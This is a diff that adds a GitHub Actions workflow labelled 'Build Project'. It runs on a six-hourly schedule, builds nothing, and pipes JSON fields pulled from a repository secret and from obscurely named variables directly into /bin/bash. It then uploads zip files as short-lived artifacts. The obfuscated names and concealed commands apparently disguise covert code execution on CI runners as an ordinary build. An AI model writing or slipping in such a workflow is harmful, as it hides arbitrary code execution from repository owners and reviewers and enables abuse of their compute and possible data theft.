@@ -1,0 +1,33 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          szg359: ${{ secrets.szg359 }}
+        run: |
+          printf '%s' "$szg359" | jq -r .ubt875 | /bin/bash
+          echo $ns30869 | jq -r .rh28 | /bin/bash
+          printf '%s' "$oanl0" | jq -r .xamyd1307 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: DVP1XotL
+          path: "*.zip"
+          retention-days: 1
